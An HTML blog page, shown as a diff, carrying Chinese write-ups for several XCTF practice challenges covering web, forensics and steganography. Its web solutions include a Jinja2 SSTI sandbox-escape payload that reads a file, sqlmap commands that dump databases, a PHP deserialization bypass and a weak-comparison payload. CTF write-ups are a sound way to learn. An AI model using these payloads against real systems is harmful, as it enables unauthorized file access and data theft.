@@ -1,0 +1,999 @@
+<!DOCTYPE HTML>
+<html lang="">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="攻防世界writeup, god_13">
+    <meta name="description" content="攻防世界 confusion1第一次接触这样的漏洞，认真学习了一波0x00题目介绍打开是一个网站，有登陆注册功能，正中间还有一张图片（后来才知道代表php vs python）但是点击登陆注册都显示404，就很迷了，之后又去扫描了网站，并没">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>攻防世界writeup | god_13</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">god_13</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>Index</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>Tags</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>Categories</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>Archives</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>About</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>Friends</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="Search"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">god_13</div>
+        <div class="logo-desc">
+            
+            It&#39;s easy just as a step back!
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                Index
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                Tags
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                Categories
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                Archives
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                About
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                Friends
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/Dvsx/dvsx.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/Dvsx/dvsx.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank" data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewbox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        攻防世界writeup
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/" target="_blank">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2019-04-09
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
+                        2.6k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
+                        9 Min
+                    </div>
+                    
+                
+				
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="攻防世界-confusion1"><a href="#攻防世界-confusion1" class="headerlink" title="攻防世界 confusion1"></a>攻防世界 confusion1</h2><p>第一次接触这样的漏洞，认真学习了一波<br><a id="more"></a><br>0x00题目介绍<br>打开是一个网站，有登陆注册功能，正中间还有一张图片（后来才知道代表php vs python）<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/1.PNG" alt=""><br>但是点击登陆注册都显示404，就很迷了，之后又去扫描了网站，并没有发现什么有用的东西<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/2.PNG" alt=""><br>偶然间查看页面源代码，发现了端倪<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/3.PNG" alt=""><br>这个404界面暗藏玄机啊！但还是不知道怎么做这道题</p>
+<p>0xo1查阅资料<br>其实就是查看wp…发现这道题目考察的是SSTI，好像发现了新大陆诶，然后一脸懵逼地查资料。<br>首先知道了这种题型的漏洞表现在哪，就是把我们的输入当作代码执行。<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/4.PNG" alt=""><br>还可以导出所有的config变量，有些config变量可以暴露出重要的信息<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/5.PNG" alt=""></p>
+<p>0x02解决方法<br>既然能够执行代码，就能够做很多事情，这里用到了沙箱逃逸（<a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape）" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape）</a><br>沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。<br>这道题目过滤了一些关键字，用request.args绕过，所以构造payload</p>
+<pre><code>{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read
+</code></pre><h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p>代码审计题目，题目刚进去是没有什么有用的信息，主要代码在/index.phps里面<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/6.PNG" alt=""><br>第一个条件是传入的id不能是admin，两者之间是用“===”连接的，意思是不能利用php弱类型的方法传入admin，第二个条件是传入的id参数经url解码后的值不能为admin，那么解决方法就是将admin经过两次url加密，那用传入的参数经过浏览器的自动解码，结果是经过一次url加密的admin的值。<br>站长之家的不能编码，只能解码，所以用编码转换精灵来将admin编码两次然后传入就能得到flag了<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/7.PNG" alt=""><br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/8.PNG" alt=""></p>
+<h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>题目难度：一颗星<br>题目来源： XCTF 4th-QCTF-2018<br>考察内容：post类型注入<br>使用工具：sqlmap<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/9.PNG" alt=""><br>因为之前遇到过这种类型的题目，所以一进去就知道是sql注入<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/10.PNG" alt=""><br>因为对手工注入不太熟悉，所以干脆放弃手工直接用sqlmap（这是硬伤，有好多注入的题型用sqlmap是扫不出来的），这用sqlmap也不是好用的，因为之前只知道get类型的注入语句，所以就用get的方法尝试注入，但是一直报错，一度让我怀疑这道题考的是不是注入。后来看了wp才知道，原来是TMD POST类型的注入<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/11.PNG" alt="这是报错的情况"><br>POST类型的注入和GET类型的诸如类似，只是多了一个参数，下面先来复习一下GET类型的注入吧(以当前题目的url为例)<br><strong>查看能不能注入：</strong></p>
+<pre><code>python2 sqlmap.py -u &quot;http://111.198.29.45:30407/?id=1&quot;
+</code></pre><p><strong>爆数据库：</strong></p>
+<pre><code>python2 sqlmap.py -u &quot;http://111.198.29.45:30407/?id=1&quot; --dbs
+</code></pre><p><strong>爆表名：</strong></p>
+<pre><code>python2 sqlmap.py -u &quot;http://111.198.29.45:30407/?id=1&quot; -D 数据库名 --tables
+</code></pre><p><strong>爆列名：</strong></p>
+<pre><code>python2 sqlmap.py -u &quot;http://111.198.29.45:30407/?id=1&quot; -D 数据库名 -T 表名 --cloumns
+</code></pre><p><strong>爆字段：</strong></p>
+<pre><code>python2 sqlmap.py -u &quot;http://111.198.29.45:30407/?id=1&quot; -D 数据库名 -T 表名 -C &quot;字段&quot; --dump
+</code></pre><p>接下来看看post类型的注入<br><strong>爆数据库：</strong></p>
+<pre><code>python2 sqlmap.py -u &quot;http://47.96.118.255:33066/&quot; --forms --dbs
+</code></pre><p>post类型的注入会有问题，默认y就可以<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/12.PNG" alt=""><br><strong>爆表名：</strong></p>
+<pre><code>python2 sqlmap.py -u &quot;http://47.96.118.255:33066/&quot; --forms -D news --tables
+</code></pre><p><strong>爆字段：</strong></p>
+<pre><code>python2 sqlmap.py -u &quot;http://47.96.118.255:33066/&quot; --forms -D news -T secret_table --dump
+</code></pre><p>最后得到flag<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/13.PNG" alt=""></p>
+<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>本题目考察的是php反序列化和<strong>__weakup()</strong>函数的绕过<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/14.PNG" alt=""><br>和php序列化反序列化相联系的肯定就是魔术函数了，<strong>__weakup()</strong>函数是在反序列化的时候需要检查的函数，如果存在就跳过其他函数，直接执行<strong>__weakup()</strong>函数的内容。这道题目就是这样的，执行exit(‘bad requests’),而不执行echo flag.所以我们需要做的就是绕过<strong>__weakup()</strong>函数。<br><strong>绕过__weakup()函数的方法</strong><br>先来看一下字符串序列化后的结果<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/15.PNG" alt=""><br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/16.PNG" alt=""></p>
+<pre><code>O:代表object（类），还有一种是A，代表数组
+4:代表对象名字占4个字符
+xctf：对象名
+1:对象有一个变量
+s:数据类型，s代表string，i代表int
+</code></pre><p>知道了这些，就可以绕过魔术函数了，方法就是让序列化的结果出错，就像例子中的，我们的类中本来就只有一个$flag变量，如果我们把变量名输入为2，就可以成功绕过了。<br>构造payload如下：<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/17.PNG" alt=""><br>就可以成功得到flag了</p>
+<h2 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery!"></a>Lottery!</h2><p>这道题目很有意思，是买彩票的，题目的界定是默认给你20块钱让你买彩票，每买一次花两块钱，买的是7个数字，规则如下：<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/30.PNG" alt=""><br>这和买彩票的规则是一致的，想要实现很困难，我们发现网页有一个买flag的页面<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/31.PNG" alt=""><br>但是我们的20块钱也买不了这么贵的东西，所以就想到了抓包，看看能不能修改一些值来完成这个操作，发现并不能实现这个理想的功能。<br>然后就从网站入手，输入robots.txt发现有git源码泄露漏洞，然后就把源码下下来，进行代码审计。<br>审计发现漏洞在api.php里<br>api.php</p>
+<pre><code>function buy($req){
+    require_registered();
+    require_min_money(2);
+
+    $money = $_SESSION[&#39;money&#39;];
+    $numbers = $req[&#39;numbers&#39;];
+    $win_numbers = random_win_nums();
+    $same_count = 0;
+    for($i=0; $i&lt;7; $i++){
+        if($numbers[$i] == $win_numbers[$i]){
+            $same_count++;
+        }
+    }
+</code></pre><p>分析：只要$same_count每一位都不是0的时候，就可以中最高的奖了。<br>操作：抓包改包，{“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]},利用的是php弱类型的松散比较，支持布尔类型的数据，因此传入7个true即可。</p>
+<h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>ext3是第三代扩展文件系统，是一个日志文件系统，常用于Linux操作系统。它是很多Linux发行版的默认文件系统。<br>这道题下载下来后是一个名为Linux的文件，并没有后缀，但是根据题目的名字，我们应该知道这是一个ext3文件。我们把它拉到kali下，使用strings查看字符串，定位flag可能出现的位置。<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/18.PNG" alt=""><br>发现存在flag.txt文件，那怎么打开呢<br>一种方法是直接binwalk，把文件给分离出来<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/19.PNG" alt=""><br>还有一种方法是通过挂载的方法来解决<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/20.PNG" alt=""><br>两种方法最后都会得到一串字符串，然后base64解密就可以得到flag了</p>
+<h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>这道题给的是一张动图，我们发现动图的最后有一个二维码一闪而过，那我们就把动图拆分成一帧一帧的，最后得到二维码就行了，所以就用GIFframe来将图片拆分，最后得到的二维码发现没有定位符<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/21.PNG" alt=""><br>那我们就手动添加定位符，再网上搜索定位符，使然后用电脑自带的画图工具“print 3D”将定位符添上再扫描即可得到flag<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/22.PNG" alt=""></p>
+<h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p>这道题考察的是pdf隐写，只需要把pdf转成word就会显示出来图片下的flag了</p>
+<h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p>这道题其实是个用java写的小游戏，只要能坚持60s不碰到障碍物，也能得到flag，不过有点难，所以使用java反编译工具jd-gui来直接查看源代码<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/23.PNG" alt=""><br>base64解码即可</p>
+<h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>下载下来是一串佛文</p>
+<pre><code>夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮
+</code></pre><p>之前对“与佛论禅”旅有耳闻，很自然的就想到了这里，<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/24.PNG" alt=""><br>把佛文输入到佛家妙语当中去，而且要在前面加上“佛曰”，不然解不出来，点击“参悟佛所言的真意”，就可以解出来flag</p>
+<h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>下载好了是一堆黑白的图片<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/25.PNG" alt=""><br>白色定为0，黑色定为1，前八个先试验一下，发现是f<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/26.PNG" alt=""><br>写一个脚本，不用一个一个找了</p>
+<pre><code>//python2
+import os
+white = open(&quot;./gif/0.jpg&quot;,&quot;rb&quot;).read()
+black = open(&quot;./gif/1.jpg&quot;,&quot;rb&quot;).read()
+
+flag_binary = &quot;&quot;
+
+for i in range(104):
+    with open(&quot;./gif/%d.jpg&quot;%i,&quot;rb&quot;) as f:
+        if f.read() == white:
+            flag_binary += &quot;0&quot;
+        else:
+            flag_binary += &quot;1&quot;
+
+flag = &quot;&quot;
+
+for i in range(len(flag_binary)/8):
+    flag += chr(int(flag_binary[i*8:(i+1)*8],2))//切片，八位一组，转换为二进制然后转为ASCII码
+
+print flag
+</code></pre><h2 id="SimpleRAR"><a href="#SimpleRAR" class="headerlink" title="SimpleRAR"></a>SimpleRAR</h2><p>下载下来解压后发现，有文件损坏了打不开，这道题有点不知所以然，看官方wp吧<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/27.PNG" alt=""><br><a href="https://adworld.xctf.org.cn/task/writeup?type=misc&amp;id=5102" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/writeup?type=misc&amp;id=5102</a></p>
+<h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>一张pdf，本来以为和之前的一样是pdf转为word，不过这次不行<br>先拉到kali pdfinfo一下，查找和flag有关的内容<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/28.PNG" alt=""><br>发现一段base64编码的字符串，解码发现并没有什么有用的信息，通过看wp知道了要使用pdf.js这个插件才能做出来，而且是谷歌上面的插件，在控制台输入document.documentElement.textContent来获取更多有用的信息<br><img src="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/29.PNG" alt=""><br>发现有ABABAB，而且上面也有AB和._的转换方式，那就正好可以把AB转换成摩斯密码的形式，然后解码就行了</p>
+
+            </div>
+            <hr>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/2.png" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone, qq, weibo, douban"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>Reprint policy</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
+                    <img alt="" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png">
+                </a>
+            </div>
+            <br>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
+                    《攻防世界writeup》
+                </span> by
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/04/09/ssti-mo-ban-zhu-ru-gong-fang-shi-jie/" property="cc:attributionName" rel="cc:attributionURL">
+                xiao
+            </a> is licensed under a
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
+                Creative Commons Attribution 4.0 International License
+            </a> 
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2019/04/22/ddctf-writeup/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="DDCTF writeup">
+                        
+                        <span class="card-title">DDCTF writeup</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            滴~
+打开链接，很明显，url有提示，jpg的值是经过两次base64和一次hex编码后的结果，所以反向解码得到的结果为flag.jpg本来想着是不是有php伪协议的漏洞，然后试着读取并没有读到什么有用的东西，所以直接就读取index.ph
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-22
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-user fa-fw"></i>
+                            xiao
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/" target="_blank">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
